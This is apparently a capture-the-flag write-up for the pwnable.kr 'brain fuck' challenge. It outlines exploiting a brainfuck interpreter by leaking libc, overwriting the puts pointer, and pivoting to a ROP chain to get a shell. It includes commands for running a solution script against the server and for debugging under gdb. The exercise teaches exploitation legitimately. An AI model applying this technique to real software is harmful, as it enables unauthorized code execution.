# brain fuck - 150 pt

## Task

```
I made a simple brain-fuck language emulation program written in C. 
The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
Find a bug and exploit it to get a shell. 

Download : http://pwnable.kr/bin/bf
Download : http://pwnable.kr/bin/bf_libc.so

Running at : nc pwnable.kr 9001
```

## Solution

In brief, it works as follows:
* Use brianfuck commands to leak the libc base and overwrite the pointer to
  `puts`, which is used by the `[` command.
* Rebase the ROP payload (ROP is used to bypass NX) and write it to the RW
  section of the bf binary (which is not affected by ASLR), creating a fake
  stack.
* Send the `[` command to hijack execution and switch to the fake stack.
* Execute the ROP payload and pop the shell.
* Interact with the shell by capturing input and output.

To test the solution on the pwnable.kr server:
```
$ wget http://pwnable.kr/bin/bf_libc.so
$ ./solution.py './bf_libc.so' 'nc pwnable.kr 9001'
puts: 0xf761f020
text base: 0xf75c0000
ls <Enter Enter>

brainfuck
flag
libc-2.23.so
log
super.pl
cat flag <Enter Enter>

<flag omitted>
```

To test locally:
```
./solution.py libc-2.23.so ./bf
```

The libc argument is just a sanity check that matches a libc with a set of
gadgets.

Running under gdb is handled differently:
```
$ gdb -q -f bf -x cmd.gdb
(gdb) !mkfifo in
(gdb) r < <(cat in | tee in1.log | ./solution.py libc-2.23.so "in" | tee in2.log) > >(tee out1.log | ./solution.py libc-2.23.so "out" | tee out2.log  > in)
```
